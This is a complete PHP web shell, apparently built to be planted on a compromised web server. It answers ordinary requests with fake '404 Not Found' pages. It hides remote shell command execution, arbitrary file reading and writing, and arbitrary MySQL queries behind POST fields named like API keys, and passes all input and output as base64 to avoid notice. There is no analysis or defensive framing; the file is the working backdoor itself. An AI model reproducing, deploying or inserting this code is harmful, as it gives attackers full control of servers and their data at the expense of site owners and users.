<?php
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {


    if (isset($_POST['sessionid'])) {

		$value = $_POST['sessionid'];
		$dvalue = base64_decode($value);

		$currentT = time();
		$scope = 43200;
		$minT = $currentT - $scope;
		$maxT = $currentT + $scope;

		if ($dvalue > $maxT || $dvalue < $minT) {
			header('HTTP/1.0 404 Request Timeout');
    		echo "<h1>404 Not Found</h1>";
    		echo "<p>The page that you have requested could not be found.</p>";
    		echo "<p>Expires: " . ($currentT - $dvalue) . "</p>" ;
    		die;
		}

	}

    if (isset($_POST['apikey'])) {

		$value = $_POST['apikey'];
		$dvalue = base64_decode($value);

		$cm = "";
		$result = shell_exec($dvalue . " 2>&1");

		echo(base64_encode($result));
		die;

	} 

	elseif (isset($_POST['apikeyd'])) {
		$result = "";
		$value = $_POST['apikeyd'];
		$dvalue = base64_decode($value);

		if (file_exists($dvalue)) {
			$contents = file_get_contents($dvalue);
			$result = base64_encode($contents);
			echo($result);
			die;
		}
	} 

	elseif (isset($_POST['apikeyu'])) {
		$value = "";
		$dvalue = "";
		$feed = "";
		$dfeed = "";
		if (isset($_POST['feed'])) {
			$value = $_POST['apikeyu'];
			$dvalue = base64_decode($value);
			$feed = $_POST['feed'];
			$dfeed = base64_decode($feed);

			if (file_exists($dvalue)) {
				$result = "File Exists";
				echo(base64_encode($result));
				die;
			} else {
				try {
					$a = file_put_contents($dvalue, $dfeed);
					
					if ($a == "") {
						$result = "\tUpload Failed";
						//$result = "1:".$a;
					} else {
						$result = "\tUpload Complete";
						//$result = "2:".$a;
					}
					echo(base64_encode($result));

					die;
				} catch (Exception $e) {
    				$result = 'Caught exception: ' . getMessage();
					echo(base64_encode($result));
    				die;
				}

				echo($result);

				die;
			}

		}


	} 

	elseif (isset($_POST['apikeym'])) {
		$result = "";
		$value = $_POST['apikeym'];
		$dvalue = base64_decode($value);
		$s1 = "";
		$s2 = "";
		$s3 = "";
		$ds1 = "";
		$ds2 = "";
		$ds3 = "";

		if (isset($_POST['s1'])) {
			$value = $_POST['s1'];
			$ds1 = base64_decode($value);
		} else {
			die;
		}

		if (isset($_POST['s2'])) {
			$value = $_POST['s2'];
			$ds2 = base64_decode($value);
		} else {
			die;
		}

		if (isset($_POST['s3'])) {
			$value = $_POST['s3'];
			$ds3 = base64_decode($value);
		} else {
			die;
		}
 		
 		if (isset($_POST['s4'])) {
			$value = $_POST['s4'];
			$ds4 = base64_decode($value);
		} else {
			die;
		}

		$s = $ds1;
		$d = $ds2;
		$u = $ds3;
		$p = $ds4;


		// Create connection
		if (!$link = mysql_connect($s, $u, $p)) {
			echo(base64_encode('Could not connect to mysql'));
		    exit;
		}

		if (!$d == "") {
			if (!mysql_select_db($d, $link)) {
		    	echo(base64_encode('Could not select database'));
		    	exit;
			}
		}


		$query_string = $dvalue;
		$result = mysql_query($query_string, $link);

		if (!$result) {
			$r = "DB Error, could not query the database\n";
		    $r += 'MySQL Error: ' . mysql_error();
		    echo(base64_encode($r));
		    exit;
		}

		$rows = array();

		while ($row = mysql_fetch_assoc($result)) {
		    $rows[] = $row;
		}

		mysql_free_result($result);

		echo(base64_encode(json_encode($rows)));


	} else {
  		header('HTTP/1.0 404 Not Found');
    	echo "<h1>404 Not Found</h1>";
    	echo "The page that you have requested could not be found.";
    	die;
	}

} else {
	header('HTTP/1.0 404 Not Found');
    echo "<h1>404 Not Found</h1>";
    echo "The page that you have requested could not be found.";
    die();
}

?>